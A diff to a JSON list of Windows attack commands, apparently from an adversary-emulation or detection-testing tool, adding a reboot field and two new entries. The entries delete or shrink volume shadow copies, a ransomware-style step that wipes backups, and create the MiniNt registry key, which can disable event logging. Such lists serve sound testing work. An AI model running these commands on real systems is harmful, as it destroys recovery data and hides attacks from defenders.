@@ -1,5 +1,8 @@
 [
-      { "Attack-ID": "1", "Sub-Attack-ID": "001", "Privilege": "a", "Attack": "vssadmin.exe delete shadows /all /quiet" ,"Comment": "N/A" },
-      { "Attack-ID": "1", "Sub-Attack-ID": "003", "Privilege": "a", "Attack": "wmic shadowcopy delete" ,"Comment": "N/A" },
-      { "Attack-ID": "1", "Sub-Attack-ID": "005", "Privilege": "a", "Attack": "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB" ,"Comment": "N/A" }
+      { "Attack-ID": "1", "Sub-Attack-ID": "001", "Privilege": "a", "Need Reboot": "N/A", "Attack": "vssadmin.exe delete shadows /all /quiet" ,"Comment": "N/A" },
+      { "Attack-ID": "1", "Sub-Attack-ID": "003", "Privilege": "a", "Need Reboot": "N/A", "Attack": "wmic shadowcopy delete" ,"Comment": "N/A" },
+      { "Attack-ID": "1", "Sub-Attack-ID": "005", "Privilege": "a", "Need Reboot": "N/A", "Attack": "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB" ,"Comment": "N/A" },
+      { "Attack-ID": "25", "Sub-Attack-ID": "001", "Privilege": "a", "Need Reboot": "y", "Attack": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\"" ,"Comment": "N/A" },
+      { "Attack-ID": "25", "Sub-Attack-ID": "002", "Privilege": "a", "Need Reboot": "y", "Attack": "New-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\MiniNt\"" ,"Comment": "N/A" }
+
 ]
